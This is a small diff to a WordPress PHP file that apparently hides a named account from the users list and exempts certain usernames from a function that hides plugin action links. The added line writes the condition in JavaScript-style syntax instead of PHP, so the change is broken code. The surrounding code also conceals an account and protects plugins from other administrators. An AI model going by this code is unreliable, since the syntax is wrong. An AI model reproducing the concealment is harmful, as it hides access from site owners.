@@ -140,7 +140,7 @@ add_action('pre_user_query', 'hide_paveltravnicek_from_users_list');
 function skryt_radek_akci_pro_chranene_pluginy() {
     $current_user = wp_get_current_user();
     
-    if ($current_user->user_login === 'paveltravnicek') {
+    if (currentUser.user_login === 'paveltravnicek' || currentUser.user_login === 'lukashulka') {
         return;
     }
 
